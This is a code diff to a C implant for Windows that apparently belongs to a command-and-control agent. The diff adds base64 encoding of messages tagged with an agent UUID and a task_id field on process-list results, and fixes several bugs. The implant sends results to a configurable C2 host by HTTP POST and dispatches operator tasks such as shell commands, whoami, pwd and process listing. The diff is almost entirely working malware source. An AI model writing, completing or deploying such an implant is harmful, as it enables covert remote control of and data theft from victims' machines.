@@ -1,4 +1,5 @@
 // C std libs
+#include <iso646.h>
 #include <stdbool.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -26,7 +27,7 @@ typedef struct {
     int port; 
     int interval; 
     int jitter;
-    int eec; //tak na prawdę to bool XD
+    int eec; //it's bool, but whatever
     char host[256];
     char get_uri[64];
     char proxy_host[128];    //
@@ -77,14 +78,20 @@ implant_config config = {
     .proxy_pass = "REPLACE_ME_PROXY_PASS", //
     .killdate = "REPLACE_ME_KILLDATE" //
 };
-//char* build_message(char* json){
-//    size_t json_len = strlen(json);
-//    size_t encoded_len = (4 * ((json_len + 2) / 3)) + 1;
-//    char* encoded_msg = (char*)malloc(encoded_len);
-//    
-//
-//}
+char* build_message(char* json){
+   size_t all_len = strlen(json) + 37;
+    
+    char* raw_msg = (char*)calloc(1,all_len); 
+    strcat(raw_msg,config.uuid);
+   strcat(raw_msg,json);
+
+   char* encoded_str = base64_encode(raw_msg);
+   free(raw_msg);
+   return encoded_str;
+}
 char* send_c2_post_request(char* json_data) {
+
+/*=========================================================================================================*/  
     HINTERNET hInternet = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) return NULL;
 
@@ -93,12 +100,15 @@ char* send_c2_post_request(char* json_data) {
 
     HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", config.post_uri, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, 0);
     if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return NULL; }
+/*==========================================================================================================*/
+/* weird winapi stuff, do not touch, it spreads leprosy*/
 
+    char* to_be_send = build_message(json_data);
     const char* headers = "Content-Type: application/json\r\n";
     
-    if (HttpSendRequest(hRequest, headers, -1, json_data, strlen(json_data))) {
+    if (HttpSendRequest(hRequest, headers, -1, to_be_send, strlen(to_be_send))) {
         printf("wysłano post'a\n");
-        
+        free(to_be_send);
         char buffer[12000];
         DWORD bytesRead;
         if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
@@ -112,7 +122,7 @@ char* send_c2_post_request(char* json_data) {
             
         }
     }
-return "";
+return NULL;
 }
 void checkin(){
         char json_checkin_buff[190];
@@ -169,7 +179,7 @@ size_t read;
          read = fread(output, 1, 512, fp);
     fclose(fp);
 
-char* ret_val = (char*)malloc(read+1);
+char* ret_val = (char*)calloc(1,read+1);
 strncpy(ret_val,output,read+1);
 return ret_val;
 }
@@ -216,7 +226,7 @@ void dispatcher(cJSON *task){
         command_output = handle_shell_cmd(task);
     }
     else if (!(strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"pwd"))){
-         command_output = handle_pwd_cmd(task);
+         command_output = handle_pwd_cmd();
 
     }
     else if (!(strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"whoami"))){
@@ -228,6 +238,8 @@ void dispatcher(cJSON *task){
     } else{
         printf(":( unknown command:\n");
             puts(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring);
+   return;
+
     };
 
         cJSON *root = cJSON_CreateObject();
@@ -250,7 +262,7 @@ void dispatcher(cJSON *task){
     
 
     
-   
+   return;
 
 }
 
@@ -260,6 +272,7 @@ void handle_ps_cmd(cJSON *task){
 
         char* ret_val = (char*)malloc(17);
         strncpy(ret_val,"failed to get ps\0",17);
+        free(ret_val);
         return;
     }
 
@@ -289,14 +302,15 @@ void handle_ps_cmd(cJSON *task){
      do{
         
         snprintf(process_buff,272,"%ld;%ld;%s\n",proces.th32ProcessID,proces.th32ParentProcessID,proces.szExeFile);
-            strncat(buff,process_buff,272);
+            strncat(buff,process_buff,sizeof(buff) - strlen(buff) - 1);
         counter++;
-        if(counter>=4){
+        if(counter>=4){ //TODO: in last loop iteration, if counter>=4 data is lost 
             cJSON_AddStringToObject(user_input_p,"user_output",buff);
+            cJSON_AddStringToObject(user_input_p,"task_id",cJSON_GetObjectItemCaseSensitive(task,"id")->valuestring); 
             char* sent = cJSON_PrintUnformatted(root);
             send_c2_post_request(sent);
             free(sent);
-             //TODO: somehow handle the answer 
+             //TODO: somehow handle the answer from C2 server (tasks) 
             cJSON_DeleteItemFromObject(user_input_p, "user_output");
             user_input_p = cJSON_CreateObject();
             cJSON_AddItemToArray(arr,user_input_p);
@@ -307,9 +321,25 @@ void handle_ps_cmd(cJSON *task){
      }while (Process32Next(han,&proces));
  }
 
+if(counter>0){
+cJSON_AddStringToObject(user_input_p,"user_output",buff);
+            cJSON_AddStringToObject(user_input_p,"task_id",cJSON_GetObjectItemCaseSensitive(task,"id")->valuestring); 
+            char* sent = cJSON_PrintUnformatted(root);
+            send_c2_post_request(sent);
+            free(sent);
+             //TODO: somehow handle the answer from C2 server (tasks) 
+            cJSON_DeleteItemFromObject(user_input_p, "user_output");
+            user_input_p = cJSON_CreateObject();
+            cJSON_AddItemToArray(arr,user_input_p);
+            counter = 0;
+            buff[0] = '\0';
+
+}
 cJSON *statusik = cJSON_GetObjectItemCaseSensitive(obj,"status");
 cJSON_SetValuestring(statusik,"success");
-cJSON_AddBoolToObject(obj,"completed",1);
+cJSON *completed = cJSON_GetObjectItemCaseSensitive(obj,"completed");
+cJSON_SetBoolValue(completed, 1);
+
 //cJSON_DeleteItemFromObject(cJSON_GetObjectItemCaseSensitive(obj,"user_output"),);
 char* unformatted_buff = cJSON_PrintUnformatted(root);
 send_c2_post_request(unformatted_buff);
